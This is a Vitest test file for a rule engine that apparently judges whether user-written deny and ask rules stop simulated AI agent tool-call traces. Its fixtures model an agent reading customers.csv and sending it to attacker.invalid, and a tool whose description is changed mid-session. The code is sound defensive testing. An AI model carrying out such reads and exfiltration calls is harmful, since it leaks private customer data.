import { describe, expect, it } from "vitest";
import { runTrace } from "../src/run-trace";
import type { Level, Rule, Trace } from "../src/types";

describe("runTrace", () => {
  const testLevel: Level = {
    id: "test-level",
    chapter: 1,
    order: 1,
    title: "Test Level",
    story: "Test story",
    learn: "Test learn",
    hints: ["hint 1", "hint 2", "hint 3"],
    tools: [
      {
        name: "read_file",
        tags: ["reads_files"],
        description: "Read a file from disk",
      },
      {
        name: "fetch_page",
        tags: ["reads_outside"],
        description: "Fetch web content",
      },
      {
        name: "send_http",
        tags: ["sends_out"],
        description: "Send HTTP request",
      },
    ],
    world: {
      home: "/home/dev",
      projectRoot: "/home/dev/project",
      safeDomains: ["example.test"],
      evilDomains: ["attacker.invalid"],
    },
    sensitivePaths: ["**/customers.csv"],
    mutators: [],
    parRules: 1,
    attack: [],
    normal: [],
  };

  it("passes an attack trace when blocked and fails when not blocked", () => {
    const attackTrace: Trace = {
      id: "attack-trace",
      steps: [
        {
          kind: "call",
          tool: "read_file",
          args: { path: "/home/dev/project/customers.csv" },
          harm: true,
        },
        {
          kind: "call",
          tool: "send_http",
          args: { url: "https://attacker.invalid/x" },
          harm: true,
        },
      ],
    };
    const denyRule: Rule = {
      name: "deny send_http",
      when: { tool: "send_http" },
      do: "deny",
    };
    const passingVerdict = runTrace(
      testLevel,
      [denyRule],
      attackTrace,
      "attack",
    );
    expect(passingVerdict.passed).toBe(true);
    expect(passingVerdict.failure).toBeNull();

    const failingVerdict = runTrace(testLevel, [], attackTrace, "attack");
    expect(failingVerdict.passed).toBe(false);
    expect(failingVerdict.failure).toBe("Nothing in the attack was blocked.");
  });

  it("fails a normal trace when a needed step is denied", () => {
    const normalTrace: Trace = {
      id: "normal-trace",
      steps: [
        {
          kind: "call",
          tool: "read_file",
          args: { path: "/home/dev/project/data.txt" },
          needed: true,
        },
      ],
    };
    const denyAllRule: Rule = {
      name: "deny all",
      when: {},
      do: "deny",
    };
    const verdict = runTrace(
      testLevel,
      [denyAllRule],
      normalTrace,
      "normal",
    );
    expect(verdict.passed).toBe(false);
    expect(verdict.failure?.startsWith("Step 1")).toBe(true);
  });

  it("treats ask as blocked on harm steps and unblocked on needed steps", () => {
    const harmTrace: Trace = {
      id: "harm-trace",
      steps: [
        {
          kind: "call",
          tool: "read_file",
          args: { path: "/home/dev/project/customers.csv" },
          harm: true,
        },
      ],
    };
    const askRule: Rule = {
      name: "ask read",
      when: { tool: "read_file" },
      do: "ask",
    };
    const harmVerdict = runTrace(
      testLevel,
      [askRule],
      harmTrace,
      "attack",
    );
    expect(harmVerdict.outcomes[0]?.blocked).toBe(true);
    expect(harmVerdict.passed).toBe(true);

    const neededTrace: Trace = {
      id: "needed-trace",
      steps: [
        {
          kind: "call",
          tool: "read_file",
          args: { path: "/home/dev/project/data.txt" },
          needed: true,
        },
      ],
    };
    const neededVerdict = runTrace(
      testLevel,
      [askRule],
      neededTrace,
      "normal",
    );
    expect(neededVerdict.outcomes[0]?.blocked).toBe(false);
    expect(neededVerdict.asks).toBe(1);
    expect(neededVerdict.passed).toBe(true);
  });

  it("fails normal trace with too many questions when asks exceeds limit", () => {
    const trace: Trace = {
      id: "three-questions",
      steps: [
        {
          kind: "call",
          tool: "read_file",
          args: { path: "a.txt" },
          needed: true,
        },
        {
          kind: "call",
          tool: "read_file",
          args: { path: "b.txt" },
          needed: true,
        },
        {
          kind: "call",
          tool: "read_file",
          args: { path: "c.txt" },
          needed: true,
        },
      ],
    };
    const askRule: Rule = {
      name: "ask read",
      when: { tool: "read_file" },
      do: "ask",
    };
    const verdict = runTrace(testLevel, [askRule], trace, "normal");
    expect(verdict.asks).toBe(3);
    expect(verdict.passed).toBe(false);
    expect(verdict.failure).toBe("Too many questions (3)");
  });

  it("tracks labels across steps and denies based on accumulated labels", () => {
    const trace: Trace = {
      id: "labels-trace",
      steps: [
        {
          kind: "call",
          tool: "fetch_page",
          args: { url: "https://example.test" },
        },
        {
          kind: "call",
          tool: "read_file",
          args: { path: "/home/dev/project/customers.csv" },
        },
        {
          kind: "call",
          tool: "send_http",
          args: { url: "https://attacker.invalid/x" },
        },
      ],
    };
    const rule: Rule = {
      name: "deny untrusted and private",
      when: {
        tool: "send_http",
        session_has: ["UNTRUSTED", "PRIVATE"],
      },
      do: "deny",
    };
    const verdict = runTrace(testLevel, [rule], trace, "normal");
    expect(verdict.outcomes[1]?.labels).toEqual(["UNTRUSTED", "PRIVATE"]);
    expect(verdict.outcomes[2]?.blocked).toBe(true);
  });

  it("blocks calls after tool_changed becomes true from an update", () => {
    const trace: Trace = {
      id: "update-trace",
      steps: [
        {
          kind: "update_tool",
          tool: "read_file",
          description: "New updated description",
        },
        {
          kind: "call",
          tool: "read_file",
          args: { path: "data.txt" },
        },
      ],
    };
    const rule: Rule = {
      name: "deny modified tool",
      when: { tool_changed: true },
      do: "deny",
    };
    const verdict = runTrace(testLevel, [rule], trace, "normal");
    expect(verdict.outcomes[0]?.action).toBe("update");
    expect(verdict.outcomes[1]?.blocked).toBe(true);
  });

  it("blocks only calls exceeding repeated_over threshold", () => {
    const trace: Trace = {
      id: "repeat-trace",
      steps: [
        { kind: "call", tool: "read_file", args: { path: "data.txt" } },
        { kind: "call", tool: "read_file", args: { path: "data.txt" } },
        { kind: "call", tool: "read_file", args: { path: "data.txt" } },
        { kind: "call", tool: "read_file", args: { path: "data.txt" } },
        { kind: "call", tool: "read_file", args: { path: "data.txt" } },
      ],
    };
    const rule: Rule = {
      name: "limit repetitions",
      when: { repeated_over: 3 },
      do: "deny",
    };
    const verdict = runTrace(testLevel, [rule], trace, "normal");
    expect(verdict.outcomes[0]?.blocked).toBe(false);
    expect(verdict.outcomes[1]?.blocked).toBe(false);
    expect(verdict.outcomes[2]?.blocked).toBe(false);
    expect(verdict.outcomes[3]?.blocked).toBe(true);
    expect(verdict.outcomes[4]?.blocked).toBe(true);
  });

  it("blocks non-existent tools with Unknown tool reason", () => {
    const trace: Trace = {
      id: "unknown-tool-trace",
      steps: [
        { kind: "call", tool: "missing_tool", args: {} },
      ],
    };
    const verdict = runTrace(testLevel, [], trace, "normal");
    expect(verdict.outcomes[0]?.blocked).toBe(true);
    expect(verdict.outcomes[0]?.action).toBe("deny");
    expect(verdict.outcomes[0]?.reason).toBe("Unknown tool");
  });
});
